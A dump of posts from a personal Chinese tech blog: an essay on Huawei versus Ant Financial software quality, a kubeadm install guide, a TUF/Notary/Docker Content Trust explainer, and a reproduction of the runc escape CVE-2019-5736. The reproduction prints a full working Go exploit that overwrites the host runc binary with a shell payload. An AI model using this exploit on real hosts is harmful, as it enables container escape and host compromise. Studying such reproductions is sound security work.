[{"body":"","link":"https://weizhang555.github.io/post/","section":"post","tags":null,"title":"Posts"},{"body":"我至今在两家公司工作过，第一家是华为，第二家是蚂蚁金服。在两家待的时间都足够长了，谈谈对两家公司软件质量控制的一点感悟。\n用一句话来对比两家的软件质量的话，我称为“椰子型”和“苹果型”。两家公司基本可以代表传统软件公司与互联网公司的不同的质量管理标准。\n椰子型 苹果型 选哪个？ 椰子型 华为擅长做“椰子型”软件，外壳坚硬无比，内部一包水。\n华为的研发流程是很早就花大价钱从IBM引入的IPD研发流程，大致分为几个流程(参考)：\nCharter(立项) --\u0026gt; TR1/2/3 --\u0026gt; PDCP(中期) --\u0026gt; TR4/5 --\u0026gt; EDCP(结项)\n一个项目周期基本上是一年，PDCP之前是项目的设计和PoC阶段，可以改方案和设计，PDCP之后就不允许修改设计了，TR5要达到验收标准， 验收不过等同于项目延期，会对项目的Manager和团队的考评有重大影响，所以TR5的验收是极其重要且严肃的。\n整个开发模型沿用了很多年，基本上是个大的软件开发瀑布模型，周期长，与现在倡导的敏捷开发模式完全背道而驰。 这套开发模式引入之后一直在使用，使得华为一直对软件质量有着极其优秀的掌控，帮助华为站稳了ICT和企业市场，但过于笨重也遭到了很多内部人员的吐槽。 所以在云BU成立以后，也做了局部的敏捷开发的尝试。\n华为的整个研发体系和流程都是很笨重的，也很严肃。研发人员和测试人员的比例可以达到2:1左右（各个部门有不同），由于大量的测试人员的存在，对外出口的软件质量是极好的，不会出现太明显的Bug和崩溃等现象。\n所以在我看来，对外表现的是“椰子型”的外壳。\n但是我比较受不了的一点是，内部的人员质量参差不齐，差的真的是太差了。在我参加“三营”培训时，10个人一组做敏捷开发的培训，全组竟然只有我一个人能写程序，其他9个人给我做测试，也是很搞笑。更可笑的是我们组最后做出来的软件评分是第一名，可能是由于开发：测试达到了1:9吧。\n大量的低水平开发造就了垃圾一般的代码质量，所以华为的软件只能黑盒来用，要是你看到了实现的代码，怕是要战战兢兢吐一口老血了。\n“水”代码其实也不能完全怪垃圾程序员，我自己也写过很多自己不屑的垃圾代码，让我来告诉你原因。\n在最后的突击测试阶段，管理者是要看测试的漏洞数据的，要求随时间的推进测试人员发现的代码bug数应该递减，最后趋近于0，这很合理对吧？ 还有两项要求，要看bug的解决时长，这个关乎manager的考核指标，所以要求每日的bug要日清；并且TR5时系统内的bug必须清0，我不管是多么难解或者重大的bug，一定要修复。\n这两项要求给我造成了巨大的麻烦，设想一下下午6点的时候，测试给你提了5个bug，你挨个看了一下，有1个几乎不可能在短时间解决，于是你跟领导反馈，领导说必须严格按照质量标准，今天一定要解决。 这个情况就多次发生在了我的身上，于是在通宵都仍然无法解决的情况下，只能用大量的workaround去想办法从cmdline和api调用层面屏蔽掉这个bug，于是我亲手给这座代码屎山贡献了更多。最终这包屎山变成了“椰子”来到了用户手里。\n内部的整套研发流程，在我看来是有好有坏的，确实严格的管理流程给了华为对产品的严密把控。华为就是有30%的一流人才带着70%的庸才做出来世界一流软件的质量，但是对我这种有点轻微代码洁癖的人来说，是无法忍受的。 我也迫切的希望能与更多优秀的人合作，而不是浪费时间教笨人做事，所以离开华为，加入了互联网公司，希望能找到更多志同道合的人。\n苹果型 互联网公司就是完全的另一个极端了，我来介绍下蚂蚁的研发流程：\n[流程加载失败...]\n你没看错，没有研发流程，质量把控流程完全没有，测试工程师也很少。 据我所知，这种模式在互联网公司比较流行，即使是Google，Facebook这种大厂也是如此，Facebook是全栈工程师，每个人开发的组件直接上线运行和实测，所以听闻Google的工程师经常嘲讽Facebook是“踩着香蕉皮滑行”，滑到哪儿算哪儿。\n这种模式之所以并没有引起大的问题，在我看来主要是两点原因：\n1.人员平均水平较高\n每个人的主观能动性比较高，代码平均质量较高，会主动写单元测试和集成测试，习惯于敏捷开发，CI/CD。靠着优秀程序员的自我修养，代码质量仍然获得了一定的保证。\n2.面向消费者业务较多，bug不敏感\nToC的业务对产品的质量要求并没有企业级或CT级要求高，Web形态的产品完全可以先推一个公测版的产品出去试试效果，对于Bug的存在是有一定容忍度的。本身互联网产品迭代快，对速度的要求胜过对质量的要求。\n所以好的互联网公司的产品质量通常是“苹果型”的，外表摸起来有一点点硬，打开来看，内部代码质量也不错。 由于测试人员缺失以及快速迭代的需求，很难将外表做的像椰子一样。\n互联网的开发流程较敏捷，留给工程师的自由发挥空间比较大，所以从我个人来说，是更喜欢互联网这种模式的。二八效应决定着一套80分的软件做到100分需要额外耗费巨大的人力，在不成正比的投入产出面前，有必要衡量下是否要继续优化下去？\n没有流程其实造成了更大的问题，项目立项随意，周期随意，没有验收标准，为了KPI每个人都在努力的造轮子却不管重复不重复。所以我看到的是，对外我们是有无数的黑科技呈现出来，从外部看我们的软件研发能力是无比强大的，但是很多黑科技只能偏居一隅没有机会获得大规模推广，大规模推广的项目也有很多致命的缺陷导致寿命不长。\n由此，阿里巴巴已经开始沦落为“geek的自留地”，自己内部玩的嗨，更多的却是“内卷”而不是创造实际价值。\n选哪个？ 二八效应对应着中国的一句成语“行百里者半九十”，所以在继续提升产品质量的时候，我们都要掂量一下是否值得如此大的投入？\n不同的企业会有不同的选择，ToB or ToC的选择会有大的不同。在我还在华为的时候，我痛恨70%的庸才拉低了华为的档次，拉低了我对外的credit，但是华为的80分到90分恰恰需要70%的庸才作为一颗颗螺丝钉消耗自身的精力来完成，而Google，Facebook的优秀人才们只愿意做软件开发的前一部分创造性的工作做到85分，而非整天无休止的消耗自己。由此造就了“椰子型”与“苹果型”软件的不同。\n选哪个？从政治正确的角度考虑，我们要做“石头型”的软件，从公司层面，“椰子型”是不错的选择，从工程师个人角度，还是“苹果型”更加友好。\n我现在要承认，自己还是很怀念IPD研发流程的，它可恨却又很有用，帮助产品找到正确的方向以及一直运行在正确的轨道上。蚂蚁相比华为，还是有小作坊vs大厂的既视感的，但是我无意贬低任意一家，对前东家和现东家我内心都是喜欢的。\nRespect to everything!\n","link":"https://weizhang555.github.io/post/different-software-types/","section":"post","tags":null,"title":"你的软件是“椰子”还是“苹果”？"},{"body":"","link":"https://weizhang555.github.io/","section":"","tags":null,"title":"长弓二十九"},{"body":"CVE-2019-5736是一个比较知名的runc漏洞，利用方式简单，危害很大，经常被拿来做云原生安全的攻击/防御演示。\n我最近也研究了下这个漏洞的使用，研究的第一步首先是复现。\n尝试了github上的示例： https://github.com/Frichetten/CVE-2019-5736-PoC ， 这里对源码做了一些修改，在下面分享一下。\n注意：ubuntu上安装的docker 18.06似乎已经打上了补丁，我手动编译了runc的1.0.0-rc5版本才成功复现。\n复现方式：\n在一个terminal里面：\n1zhangwei@zhangwei-ubuntu-vm:~/program/gocode/src/github.com/Frichetten/CVE-2019-5736-PoC$ docker run -ti -v $PWD/exploit:/exploit ubuntu:18.04 bash 另一个terminal内执行：\n1$ docker exec -ti 5b28d7ab5083 /bin/sh 此时第一个terminal的打印：\n1zhangwei@zhangwei-ubuntu-vm:~/program/gocode/src/github.com/Frichetten/CVE-2019-5736-PoC$ docker run -ti -v $PWD/exploit:/exploit ubuntu:18.04 bash 2root@5b28d7ab5083:/# /exploit 3[+] Overwritten /bin/sh successfully 4[+] Found the PID: 17 5[+] Successfully got the file handle 6[-]Failed to open /proc/self/fd/3: open /proc/self/fd/3: text file busy 7[+] Successfully got write handle \u0026amp;{0xc0000501e0} 8root@5b28d7ab5083:/# /tmp/下多了一个passwd文件。\nUbuntu下面没有原demo里使用的/etc/shadow文件，所以我修改成了/etc/passwd，会被copy到/tmp/目录下。\n修改过的源码：\n1package main 2 3// Implementation of CVE-2019-5736 4// Created with help from @singe, @_cablethief, and @feexd. 5// This commit also helped a ton to understand the vuln 6// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d 7import ( 8\t\u0026#34;fmt\u0026#34; 9\t\u0026#34;io/ioutil\u0026#34; 10\t\u0026#34;os\u0026#34; 11\t\u0026#34;strconv\u0026#34; 12\t\u0026#34;strings\u0026#34; 13\t\u0026#34;time\u0026#34; 14) 15 16// This is the line of shell commands that will execute on the host 17var payload = \u0026#34;#!/bin/bash \\n cat /etc/passwd \u0026gt; /tmp/passwd \u0026amp;\u0026amp; chmod 777 /tmp/shadow\u0026#34; 18 19func main() { 20\t// First we overwrite /bin/sh with the /proc/self/exe interpreter path 21\tfd, err := os.Create(\u0026#34;/bin/sh\u0026#34;) 22\tif err != nil { 23\tfmt.Println(err) 24\treturn 25\t} 26\tfmt.Fprintln(fd, \u0026#34;#!/proc/self/exe\u0026#34;) 27\terr = fd.Close() 28\tif err != nil { 29\tfmt.Println(err) 30\treturn 31\t} 32\tfmt.Println(\u0026#34;[+] Overwritten /bin/sh successfully\u0026#34;) 33 34\t// Loop through all processes to find one whose cmdline includes runcinit 35\t// This will be the process created by runc 36\tvar found int 37\tfor found == 0 { 38\tpids, err := ioutil.ReadDir(\u0026#34;/proc\u0026#34;) 39\tif err != nil { 40\tfmt.Println(err) 41\treturn 42\t} 43\tfor _, f := range pids { 44\tfbytes, _ := ioutil.ReadFile(\u0026#34;/proc/\u0026#34; + f.Name() + \u0026#34;/cmdline\u0026#34;) 45\tfstring := string(fbytes) 46\tif strings.Contains(fstring, \u0026#34;runc\u0026#34;) { 47\tfmt.Println(\u0026#34;[+] Found the PID:\u0026#34;, f.Name()) 48\tfound, err = strconv.Atoi(f.Name()) 49\tif err != nil { 50\tfmt.Println(err) 51\treturn 52\t} 53\t} 54\t} 55\t} 56 57\t// We will use the pid to get a file handle for runc on the host. 58\tvar handleFd = -1 59\tfor handleFd == -1 { 60\t// Note, you do not need to use the O_PATH flag for the exploit to work. 61\thandle, _ := os.OpenFile(\u0026#34;/proc/\u0026#34;+strconv.Itoa(found)+\u0026#34;/exe\u0026#34;, os.O_RDONLY, 0777) 62\tif int(handle.Fd()) \u0026gt; 0 { 63\thandleFd = int(handle.Fd()) 64\t} 65\t} 66\tfmt.Println(\u0026#34;[+] Successfully got the file handle\u0026#34;) 67 68\t// Now that we have the file handle, lets write to the runc binary and overwrite it 69\t// It will maintain it\u0026#39;s executable flag 70\tfor { 71\twriteHandle, err := os.OpenFile(\u0026#34;/proc/self/fd/\u0026#34;+strconv.Itoa(handleFd), os.O_WRONLY|os.O_TRUNC, 0700) 72\tif err != nil { 73\tfmt.Printf(\u0026#34;[-]Failed to open /proc/self/fd/%d: %v\\n\u0026#34;, handleFd, err) 74\ttime.Sleep(1 * time.Second) 75\tcontinue 76\t} 77\tif int(writeHandle.Fd()) \u0026gt; 0 { 78\tfmt.Println(\u0026#34;[+] Successfully got write handle\u0026#34;, writeHandle) 79\twriteHandle.Write([]byte(payload)) 80\treturn 81\t} 82\t} 83} ","link":"https://weizhang555.github.io/post/runc-host-escape-cve/","section":"post","tags":["容器","安全","runc"],"title":"docker-runc主机逃逸漏洞复现：CVE-2019-5736"},{"body":"","link":"https://weizhang555.github.io/tags/runc/","section":"tags","tags":null,"title":"runc"},{"body":"","link":"https://weizhang555.github.io/tags/","section":"tags","tags":null,"title":"Tags"},{"body":"","link":"https://weizhang555.github.io/tags/%E5%AE%89%E5%85%A8/","section":"tags","tags":null,"title":"安全"},{"body":"","link":"https://weizhang555.github.io/tags/%E5%AE%B9%E5%99%A8/","section":"tags","tags":null,"title":"容器"},{"body":"","link":"https://weizhang555.github.io/tags/k8s/","section":"tags","tags":null,"title":"K8s"},{"body":"本文介绍如何使用kubeadm安装一个简单的包含三个节点的集群。\n测试环境 下载 配置kubelet 拉起master节点 增加worker 测试环境 三台VM，分别为test-vm, test-vm-1, test-vm-2，系统是ubuntu 19.04\n下载 kubernetes的安装包，官方文档用apt get的方式，由于国内被墙了没法get到，可以直接从github上下载release包。把kubeadm，kubelet, kubectl装好就够了。docker当然也要装好。\n具体的安装步骤暂时略过。\n配置kubelet 三台节点可以手动配置一下kubelet服务，配置方法都是一样的：\n1# cat \u0026gt; /lib/systemd/system/kubelet.service \u0026lt;\u0026lt; EOF 2[Unit] 3Description=kubelet: The Kubernetes Node Agent 4Documentation=http://kubernetes.io/docs/ 5 6[Service] 7ExecStart=/usr/bin/kubelet 8Restart=always 9StartLimitInterval=0 10RestartSec=10 11 12[Install] 13WantedBy=multi-user.target 14EOF 上面就是简单的调用了下kubelet命令，实际上还有很多参数，这个不着急。因为我们是用kubeadm配置的，所以实际上生效的是kubeadm为kubelet设置的参数，kubelet的启动将依赖kubeadm设置的bootstrap配置：\n1# mkdir -p /etc/systemd/system/kubelet.service.d/ 2# cat \u0026gt; /etc/systemd/system/kubelet.service.d/10-kubeadm.conf \u0026lt;\u0026lt; EOF 3[Service] 4Environment=\u0026#34;KUBELET_KUBECONFIG_ARGS=--bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf\u0026#34; 5Environment=\u0026#34;KUBELET_CONFIG_ARGS=--config=/var/lib/kubelet/config.yaml\u0026#34; 6# This is a file that \u0026#34;kubeadm init\u0026#34; and \u0026#34;kubeadm join\u0026#34; generates at runtime, populating the KUBELET_KUBEADM_ARGS variable dynamically 7EnvironmentFile=-/var/lib/kubelet/kubeadm-flags.env 8# This is a file that the user can use for overrides of the kubelet args as a last resort. Preferably, 9# the user should use the .NodeRegistration.KubeletExtraArgs object in the configuration files instead. 10# KUBELET_EXTRA_ARGS should be sourced from this file. 11EnvironmentFile=-/etc/default/kubelet 12ExecStart= 13ExecStart=/usr/bin/kubelet $KUBELET_KUBECONFIG_ARGS $KUBELET_CONFIG_ARGS $KUBELET_KUBEADM_ARGS $KUBELET_EXTRA_ARGS 14EOF 设置开机启动\n1# systemctl daemon-reload 2# systemctl enable kubelet 3# systemctl start kubelet 4# swapoff -a //K8s要求关闭swap docker我这里默认都配置好了，就不详细讲解了。\n拉起master节点 这里我们用test-vm作为master节点。\n主要参考这个： https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/create-cluster-kubeadm/\n这里我先想好要用什么网络方案，自己尝试了下calico，总感觉有点问题。保守点先选择Flannel好了。\n引用一段：\nFor flannel to work correctly, you must pass --pod-network-cidr=10.244.0.0/16 to kubeadm init.\nmaster节点拉起K8s control plane：\n1# kubeadm init --pod-network-cidr=10.244.0.0/16 --image-repository=docker.io/mirrorgooglecontainers --kubernetes-version=1.13.4 --ignore-preflight-errors=SystemVerification 镜像仓库选用了docker.io/mirrorgooglecontainers 是因为默认是从k8s.io这个镜像仓库拉K8s控制组件的，这个在CN是被和谐的；K8s版本这里我永乐1.13.4，init过程把SystemVerification禁用了，是因为我的内核版本太高了（5.0.0-16），检查报错。\n运行中你可能会发现报错docker.io/mirrorgooglecontainers/coredns 镜像拉取不下来，那是因为我把所有仓库都默认换到coredns里，mirrorgooglecontainer里面并不包含coredns。手动拉取一个coredns镜像并且tag为docker.io/mirrorgooglecontainers/coredns 就可以了（tag省略了）。\n现在开始烧香拜佛，不顺利的话会看到报错or看不到报错，慢慢debug吧；一切顺利的话可以看到成功消息：\n1Your Kubernetes master has initialized successfully! 2 3To start using your cluster, you need to run the following as a regular user: 4 5 mkdir -p $HOME/.kube 6 sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config 7 sudo chown $(id -u):$(id -g) $HOME/.kube/config 8 9You should now deploy a pod network to the cluster. 10Run \u0026#34;kubectl apply -f [podnetwork].yaml\u0026#34; with one of the options listed at: 11 https://kubernetes.io/docs/concepts/cluster-administration/addons/ 12 13You can now join any number of machines by running the following on each node 14as root: 15 16 kubeadm join 192.168.122.2:6443 --token 8e8iei.lh8gumyd8ap7kgtz --discovery-token-ca-cert-hash sha256:84f7d6aeec39dc6efe60db6c82f8d97dc220c96e6455a1710c17daa060ef9300 自己按照上面信息指引把$HOME/.kube/config搞好，就可以用普通用户操作k8s集群了。下面的kubeadm留好，后面要在worker上用。\n查看下状态：\n1# kubectl get node 2NAME STATUS ROLES AGE VERSION 3test-vm NotReady master 5m4s v1.13.4 4 5# kubectl get componentstatus 6NAME STATUS MESSAGE ERROR 7controller-manager Healthy ok 8scheduler Healthy ok 9etcd-0 Healthy {\u0026#34;health\u0026#34;: \u0026#34;true\u0026#34;} 10 11# kubectl -n kube-system get pod 12NAME READY STATUS RESTARTS AGE 13coredns-9f7ddc475-8jl54 0/1 Pending 0 6m3s 14coredns-9f7ddc475-g79j2 0/1 Pending 0 6m3s 15etcd-test-vm 1/1 Running 0 5m10s 16kube-apiserver-test-vm 1/1 Running 0 5m28s 17kube-controller-manager-test-vm 1/1 Running 0 5m7s 18kube-proxy-vqqf4 1/1 Running 0 6m3s 19kube-scheduler-test-vm 1/1 Running 0 5m12s 可以看到K8s的控制面正常，但是coredns pending了，这个是因为网络还没配置。\n先别动worker节点，我们先把网络配好。\n上面我们说用Flannel：\n1# kubectl apply -f https://raw.githubusercontent.com/coreos/flannel/62e44c867a2846fefb68bd5f178daf4da3095ccb/Documentation/kube-flannel.yml 如果kubectl -n kube-system get pod 显示coredns变成running了，那就说明一切顺利，都成功了。\n不过我就遇到了一个小问题，coredns一直不变成running，利用命令kubectl -n kube-system describe pod coredns-9f7ddc475-8jl54查看错误发现，/opt/cni/bin/bridge找不到导致无法teardown pod，我找到了个bridge的cni插件放过去就解决了。\n增加worker 在worker节点test-vm-1，test-vm-2上执行同样步骤：\n1# kubeadm join 192.168.122.2:6443 --token 8e8iei.lh8gumyd8ap7kgtz --discovery-token-ca-cert-hash sha256:84f7d6aeec39dc6efe60db6c82f8d97dc220c96e6455a1710c17daa060ef9300 --ignore-preflight-errors=SystemVerification 第二个worker也如法炮制。\n顺利的话可以在master节点上看到三个node了。\n1# kubectl get node 2NAME STATUS ROLES AGE VERSION 3test-vm Ready master 28m v1.13.4 4test-vm-1 Ready \u0026lt;none\u0026gt; 51s v1.13.4 5test-vm-2 Ready \u0026lt;none\u0026gt; 61s v1.13.4 ","link":"https://weizhang555.github.io/post/kubernetes-setup/","section":"post","tags":["容器","K8s"],"title":"kubernetes安装指南"},{"body":" 1. TUF 1.1 背景 1.2 TUF的角色 1.2 TUF的工作流 step 0: 加载可信的root元数据文件 step 1: 更新root元数据文件 step 2: 下载timestamp元数据文件 step 3：下载snapshot元数据文件 step 4：下载最顶层的targets元数据 step 5：对照target元数据验证target 2. Notary 2.1 介绍 2.2 目标 2.3 Notary的密钥管理 3. Docker Content Trust本地测试 3.1 环境准备 3.2 push的镜像无签名的情况 3.3 push有签名的版本 3.4 恶意用户上传恶意镜像，覆盖ubuntu:18.04 3.5 docker content trust的问题 1. TUF 1.1 背景 TUF是Tor项目设计出的一套安全分发软件更新的框架，Notary是TUF框架的go语言实现，而Docker Content Trust是TUF框架的应用。理清三者关系有助于后续理解。\n1.2 TUF的角色 TUF框架包含五类角色，对应五把密钥，分别是Root, Target, Snapshot, Timestamp, Delegated target(可选)，每个角色对应一个元数据文件及一把密钥。\nTUF角色和密钥的理解与Notary介绍有重合，可以参考 \u0026quot;2.3 Notary的密钥管理\u0026quot;\n1.2 TUF的工作流 TUF框架的定义在这里：https://github.com/theupdateframework/specification/blob/master/tuf-spec.md 。\nstep 0: 加载可信的root元数据文件 这一步可以认为是前奏步骤。一个初始的root元数据文件应该早已经随包管理器交付到客户端，或者通过带外流程放置进去了。此时的root元数据文件的超时不重要，因为下一步会更新它。\nstep 1: 更新root元数据文件 由于现在元数据文件可能是被完全不同的一组key签名的，客户端必须有办法能持续的更新到最新的密钥，通过不断的下载中间阶段的密钥一直到最新版。\nstep 1.1: 使用N代表可信root元数据文件的版本号 step 1.2: 下载root元数据文件的N+1版本 文件名是固定的格式：VERSION_NUMBER.FILENAME.EXT (e.g., 42.root.json)。不成功的话跳转到1.8步。\nstep 1.3: 检查签名 N+1版的root元数据必须被以下密钥签名：1）N版本root元数据内指定的达到阈值数量的密钥。2）新版本的root元数据里指定的达到阈值数量的密钥。\n如果N+1版本的root元数据没有被正确签名，退出并报错。\nstep 1.4: 检查回滚攻击(rollback attach) 当前信任的root元数据文件版本（N）必须小于新的root元数据文件（N+1）。如果不是退出并报错。\nstep 1.5: 新版本元数据文件的超时时间可以忽略，1.8会检查 step 1.6: 设置受信任的root元数据文件为新的元数据文件 step 1.7: 重复step 1.1到1.7直到root元数据为最新 step 1.8: 检查冻结攻击(freeze attach) 检查当前的信任的root元数据文件是否过期，过期的报错退出。\nstep 1.9: 如果timestamp和/或snapshot密钥已经改变，删掉snapshot和timestamp元数据文件 这个是为了从快进攻击(fast-forward attach)中恢复出来。快进攻击是攻击者可以任意增加元数据的版本号：1）timestamp元数据。2）snapshot元数据。3）targets元数据。\nstep 2: 下载timestamp元数据文件 下载固定文件名timestamp.json\nstep 2.1：检查签名 使用可信的root元数据文件里包含的timestamp公钥验证签名。\nstep 2.2：检查回滚攻击 step 2.3：检查冻结攻击 step 3：下载snapshot元数据文件 如果使能了一致性snapshot，那么文件名就是VERSION_NUMBER.FILENAME.EXT (e.g., 42.snapshot.json)格式，否则就是固定的snapshot.json。\nstep 3.1：对照timestamp元数据检查 新的snapshot元数据文件的hash和版本号必须和timestamp元数据文件里的一致。否则报错并退出。\nstep 3.2：检查签名 snapshot元数据文件应该被root元数据文件里面指定的snapshot key正确签名。否则报错退出。\nstep 3.3：检查回滚攻击 step 3.4：检查冻结攻击 step 4：下载最顶层的targets元数据 下载targets.json\nstep 4.1：对照snapshot元数据检查 新的targets元数据文件的hash和版本号必须与可信的snapshot元数据文件内保存的一致。\nstep 4.2：检查“任意软件攻击”（arbitrary software attack） 新的targets元数据文件必须被root元数据文件里指定的targets密钥正确签名，否则报错退出。\nstep 4.3：检查回滚攻击 step 4.4：检查冻结攻击 step 4.5：前序遍历搜索对应的target，以最顶层的target角色为起始 Note: 前序遍历：按根节点-左子树-右子树的顺序遍历。实际上指的是targets及相应delegation角色构成的数\nstep 4.5.1 如果节点已经被访问过了，那么跳过这个节点以避免访问环路。如果角色包含了所需要的target元数据，那么跳到step 5。 step 4.5.2 递归访问delegation列表，直到找到相应的targets元数据。 step 5：对照target元数据验证target step 5.1：找到对应的target元数据，报错退出 step 5.2：否则下载相应的target，验证hash是否与target元数据里的匹配。 2. Notary 2.1 介绍 Notary一个client和一个server组件。\n它意图为用户创建一个易用的内容分发和验证系统，TLS本身可以用于加密同web server的安全通道，但是当server沦陷的时候，恶意用户可以轻易的将合法内容替换成非法内容。\n使用notary，用户可以用自己妥善保管的线下密钥签名他们的内容，然后发布它的签民的可信内容到他的notary server。\n内容的使用者，通常事先获取了内容发布者的公钥，可以与Notary server通信来验证内容的合法性和完整性。\n2.2 目标 Notary的实现基于TUF(The Update Framework)，TUF是软件安全发布与升级的通用设计。借助TUF，Notary可以获得一些关键优势：\n抗密钥泄漏。内容发布者必须使用密钥来签名内容，镜像签名系统必须保证密钥泄露之后系统可以恢复。TUF使用分层次的多把密钥，可以保证密钥泄漏不会影响。 新鲜性保证。重放攻击是常见的攻击手段，攻击者可以将老的拥有合法签名的软件包伪装成最新的软件包发布给客户，这些旧软件包可能包含漏洞。Notary使用时间戳来保证内容使用者收到的是最新的内容。 可配置的信任阈值。经常有一种情形是允许多个发布者发布同一份内容，比如某个项目的多个maintainers。使用信任阈值可以保证只有一定数量的发布者同时签名一份文件他才可以被信任，这样可以保证单独的一份密钥泄漏不会允许恶意内容被发布出去。（Q: 听上去很好，怎么用？一把用户key，一把ci key？） 签名授权。内容发布者可以将自己的部分可信内容集合授权给另一个签名者。 使用现有的发布渠道。Notary不需要和任何特殊的发布通道绑定。 不信任的Mirrors和传输。Notary的元数据可以通过任意的镜像或者通道传输。 2.3 Notary的密钥管理 TUF的密钥是分角色的，不同的密钥有不同的特性和功能。\nRoot key: 用来签名root元数据，root元数据存储了root，targets，snapshot和timestamp公钥的ID。客户可以用这些公钥来验证所有的元数据文件的签名。root key极其重要，建议离线存放，比如存在yubi key硬件里面。它的过期时间应该也是最长的，比如10年。 Snapshot key：用来签名snapshot元数据，snapshot元数据列举了集合[注1]的root，targets和delegation元数据文件的文件名大小和hash，它用于验证其他元数据文件的完整性。可以给集合的拥有者保存，也可以给notary service保存。 timestamp key: 签名timestamp元数据，timestamp元数据通过给元数据指定最小超时时间，以及指定最新的snapshot的文件名大小hash值等来保证时效性。它用来验证snapshot文件的完整性。timestamp密钥由notary service保存，它可以自动重新生成而不需要集合的拥有者参与。有效期应该最短，比如14天。 target key：签名target元数据，target元数据列举了集合内的文件名，大小及相应的hash，这个文件用来验证repository的实际内容的完整性。也用来给其他的合作者授权。这个key由拥有者持有。有效期中等，比如3年。 Delegation key：用于签名delegation元数据，delegation元数据列举了集合文件名，大小及hash。这个key与target key实际上是相似的，也可以授权给下一级合作者。 注：\n[1] .集合：docker content trust里面实际上是image名字，集合是tag的集合，\n加一张图方便理解：\n3. Docker Content Trust本地测试 3.1 环境准备 启动本地registry 1$ docker run -d -p 5000:5000 registry:2.4.1 启动notary 1$ cd notary-src-dir 2$ docker-compose up -d 导出环境变量 1$ export REGISTRY=localhost:5000 2$ export DOCKER_CONTENT_TRUST=1 3$ export DOCKER_CONTENT_TRUST_SERVER=https://localhost:4443 3.2 push的镜像无签名的情况 先pull一个测试用的镜像：\n1$ docker pull ubuntu:18.04 2$ docker images ubuntu:18.04 3REPOSITORY TAG IMAGE ID CREATED SIZE 4ubuntu 18.04 7698f282e524 12 days ago 69.9MB 5$ docker tag ubuntu:18.04 $REGISTRY/test/ubuntu:18.04 先把不使用notary签名的版本搞上去。\n1$ export DOCKER_CONTENT_TRUST=0 2$ docker push $REGISTRY/test/ubuntu:18.04 本地删除镜像，然后分别用支持Notary和不支持notary的方式pull一下试试：\n1$ docker rmi -f 7698f282e524 2$ export DOCKER_CONTENT_TRUST=1 3$ docker pull $REGISTRY/test/ubuntu:18.04 4Error: remote trust data does not exist for localhost:5000/test/ubuntu: localhost:4443 does not have trust data for localhost:5000/test/ubuntu 5$ export DOCKER_CONTENT_TRUST=0 6$ docker pull $REGISTRY/test/ubuntu:18.04 718.04: Pulling from test/ubuntu 86abc03819f3e: Pull complete 905731e63f211: Pull complete 100bd67c50d6be: Pull complete 11Digest: sha256:b36667c98cf8f68d4b7f1fb8e01f742c2ed26b5f0c965a788e98dfe589a4b3e4 12Status: Downloaded newer image for localhost:5000/test/ubuntu:18.04 可以看到如果用户上次的image没有被notary签名过，那么当客户端指定enable了content trust之后，是无法pull不可信的image的。\n3.3 push有签名的版本 1$ export DOCKER_CONTENT_TRUST=1 2$ docker push $REGISTRY/test/ubuntu:18.04 3The push refers to repository [localhost:5000/test/ubuntu] 48d267010480f: Layer already exists 5270f934787ed: Layer already exists 602571d034293: Layer already exists 718.04: digest: sha256:b36667c98cf8f68d4b7f1fb8e01f742c2ed26b5f0c965a788e98dfe589a4b3e4 size: 943 8Signing and pushing trust metadata 9You are about to create a new root signing key passphrase. This passphrase 10will be used to protect the most sensitive key in your signing system. Please 11choose a long, complex passphrase and be careful to keep the password and the 12key file itself secure and backed up. It is highly recommended that you use a 13password manager to generate the passphrase and keep it safe. There will be no 14way to recover this key. You can find the key in your config directory. 15Enter passphrase for new root key with ID 74088e3: 16Repeat passphrase for new root key with ID 74088e3: 17Enter passphrase for new repository key with ID 5e28dca: 18Repeat passphrase for new repository key with ID 5e28dca: 19Finished initializing \u0026#34;localhost:5000/test/ubuntu\u0026#34; 20Successfully signed localhost:5000/test/ubuntu:18.04 可以看到push成功了之后会在给notary做一次签名。\n此时客户端可以成功pull，不论CONTENT_TRUST是否enble，签名检查对用户是透明的。\n使用以下命令可以撤销对image的签名：\n1$ docker trust revoke $REGISTRY/test/ubuntu:18.04 3.4 恶意用户上传恶意镜像，覆盖ubuntu:18.04 先使用如下Dockerfile制作一个恶意image：\n1FROM localhost:5000/test/ubuntu:18.04 2 3MAINTAINER black-hat 4RUN apt update \u0026amp;\u0026amp; apt install -y sl 5CMD [\u0026#34;/usr/games/sl\u0026#34;] 制作image的命令：\n1$ docker build -t ubuntu:evil . 这个镜像run起来之后会有一个小火车跑过:-)\n我们切换一个账户，尝试用普通账户签名并且覆盖原先的ubuntu:18.04\n1$ su - test 2$ export REGISTRY=localhost:5000 3$ export DOCKER_CONTENT_TRUST=1 4$ export DOCKER_CONTENT_TRUST_SERVER=https://localhost:4443 5$ docker tag ubuntu:evil $REGISTRY/test/ubuntu:18.04 6$ docker push $REGISTRY/test/ubuntu:18.04 7The push refers to repository [localhost:5000/test/ubuntu] 80f5d6ef7110f: Pushed 98d267010480f: Layer already exists 10270f934787ed: Layer already exists 1102571d034293: Layer already exists 1218.04: digest: sha256:8ff78797f8ce02027d187f3a0c27502e134aa18163c62e110001e11b1a95b36d size: 1155 13Signing and pushing trust metadata 14ERRO[0002] couldn\u0026#39;t add target to targets: could not find necessary signing keys, at least one of these keys must be available: 5e28dcaf218a140b6eeb8af239c2c44a2fbc7103d41759b5bc7aeaa3b7a5ec4e 15failed to sign localhost:5000/test/ubuntu:18.04: could not find necessary signing keys, at least one of these keys must be available: 5e28dcaf218a140b6eeb8af239c2c44a2fbc7103d41759b5bc7aeaa3b7a5ec4e 可以看到由于这个用户由于没有合法的密钥，是无法给image做签名的。但是镜像上传成功了。这部分理论上应该有registry的身份认证拦截。\n我们切换回root用户，把本地镜像删除了，禁用content trust之后再来试一次。\n1$ sudo su 2$ docker rmi -f `docker images ubuntu:evil -q` 3$ docker rmi -f `docker images $REGISTRY/test/ubuntu -q` 4$ export DOCKER_CONTENT_TRUST=0 5$ docker run -ti $REGISTRY/test/ubuntu:18.04 可以看到小火车跑过，证明本地的image下载的是恶意的。\n重新删除，然后再带Content Trust试一下。\n1$ docker rmi -f `docker images $REGISTRY/test/ubuntu -q` 2$ export DOCKER_CONTENT_TRUST=1 3$ docker pull $REGISTRY/test/ubuntu:18.04 4# docker pull $REGISTRY/test/ubuntu:18.04 5No valid trust data for 18.04 